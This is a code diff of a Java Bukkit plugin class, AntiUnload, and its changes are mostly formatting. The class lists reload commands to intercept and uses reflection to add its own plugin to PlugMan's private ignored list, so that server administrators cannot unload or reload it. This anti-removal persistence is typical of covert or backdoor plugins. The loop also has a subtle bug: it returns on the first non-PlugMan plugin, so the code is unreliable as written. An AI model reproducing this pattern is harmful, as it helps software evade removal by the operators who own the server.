@@ -11,7 +11,8 @@ import java.util.List;
 import java.util.Map;
 
 public class AntiUnload {
-    private static String[] commands = {"bukkit:rl", "bukkit:reload", "reload", "rl"};
+    private static final String[] commands = {"bukkit:rl", "bukkit:reload", "reload", "rl"};
+
     public static void Init() throws Exception {
         antiPlugman();
         Object server = Start.GetBukkitServer();
@@ -27,16 +28,15 @@ public class AntiUnload {
     private static final void antiPlugman() {
         for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
             boolean isPlugMan = plugin != null && plugin.getName().equalsIgnoreCase("PlugMan");
-            if(!isPlugMan) return;
-            try
-            {
+            if (!isPlugMan) return;
+            try {
                 Field ignoredPluginsField = plugin.getClass().getDeclaredField("ignoredPlugins");
                 ignoredPluginsField.setAccessible(true);
                 List<String> ignored = (List<String>) ignoredPluginsField.get(plugin);
 
                 ignored.add(Start.Instance.getName());
+            } catch (Exception ignored) {
             }
-            catch (Exception ignored) {}
         }
     }
 }
